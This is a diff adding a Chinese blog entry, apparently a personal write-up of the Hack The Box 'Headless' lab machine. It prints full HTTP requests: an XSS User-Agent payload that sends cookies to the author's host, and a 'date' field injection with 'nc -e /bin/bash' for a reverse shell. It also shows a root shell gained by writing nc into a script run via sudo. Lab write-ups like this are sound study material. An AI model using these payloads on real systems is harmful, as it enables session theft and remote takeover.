@@ -633,4 +633,52 @@
         <tag>复盘</tag>
       </tags>
   </entry>
+  <entry>
+    <title>htb headless复盘</title>
+    <url>/2024/04/05/htb-headless%E5%A4%8D%E7%9B%98/</url>
+    <content><![CDATA[<p>刚开始接触htb，感觉很有收获，记录一下</p>
+<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://app.hackthebox.com/machines/Headless" >https://app.hackthebox.com/machines/Headless<i class="fas fa-external-link-alt"></i></a></p>
+<p>难度：easy</p>
+<p>IP：10.10.11.8</p>
+<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>扫到22端口和5000端口，5000端口是upnp服务，要用http协议访问</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405110933.png" ></p>
+<p>能看到一个表单，思路是ssti，sql注入，xss，先尝试ssti</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405111018.png" ></p>
+<p>被拦截了，而且信息还说会把相关信息发给管理员，<strong>思路来了，这地方就可以考虑xss</strong></p>
+<p>构造一个恶意xss数据包，同时还要在本地用python开启一个http服务看返回的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 5666</span><br></pre></td></tr></table></figure>
+
+<p>发包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /support HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">Content-Length: 59</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: &lt;img src=15m0 onerror=fetch(&quot;http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://10.10.11.8:5000/support</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">fname=1&amp;lname=1&amp;email=1@1.com&amp;phone=1&amp;message=1%0a&#123;&#123;1*1&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>**User-Agent: &lt;img src&#x3D;15m0 onerror&#x3D;fetch(“<a class="link"   href="http://10.10.16.19:5666/?cookie=%22+document.cookie);%3E**%E9%87%8D%E7%82%B9%E6%98%AF%E8%BF%99%E4%B8%AA" >http://10.10.16.19:5666/?cookie=&quot;+document.cookie);&gt;**重点是这个<i class="fas fa-external-link-alt"></i></a></p>
+<p>然后等待一下，就弹回了cookie</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112257.png" ></p>
+<p>同时dirsearch扫出来dashboard目录</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112318.png" ></p>
+<p>拿到了cookie在访问dashboard就不会401了</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405112541.png" ></p>
+<h4 id="Userflag"><a href="#Userflag" class="headerlink" title="Userflag"></a>Userflag</h4><p>抓包发现有post发送了了一个date数据，这里的思路是命令注入，有点难想到吧</p>
+<p>在date后面加；然后写入命令反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /dashboard HTTP/1.1</span><br><span class="line">Host: 10.10.11.8:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line">Origin: http://10.10.11.8:5000</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.10.11.8:5000/dashboard</span><br><span class="line">Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">date=2023-09-15;nc -e /bin/bash 10.10.16.19 1234</span><br></pre></td></tr></table></figure>
+
+<p>nc开启监听，成功拿到shell，拿到user.txt</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405113521.png" ></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>sudo -l 查到一个syscheck，是个脚本文件</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114121.png" ></p>
+<p>主要调用了initdb.sh，那思路就是往里面写命令就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;nc -e /bin/bash 10.10.16.19 8888&#x27; &gt; initdb.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后sudo &#x2F;usr&#x2F;bin&#x2F;syscheck，本地开启监听</p>
+<p>成功拿到root</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240405114946.png" ></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这个靶场还是挺简单的，比较有特色的是5000端口判断xss那里，体验了真实构造恶意代码拿到cookie，还有命令注入那里比较难想，提权就还好。</p>
+<h5 id="本文参考"><a href="#本文参考" class="headerlink" title="本文参考"></a>本文参考</h5><p><a class="link"   href="https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c" >https://medium.com/@jamesjarviscyber/headless-htb-writeup-4e704aa8e52c<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   href="https://blog.csdn.net/m0_60351808/article/details/137128551" >https://blog.csdn.net/m0_60351808/article/details/137128551<i class="fas fa-external-link-alt"></i></a></p>
+]]></content>
+      <tags>
+        <tag>复盘</tag>
+        <tag>htb</tag>
+      </tags>
+  </entry>
 </search>
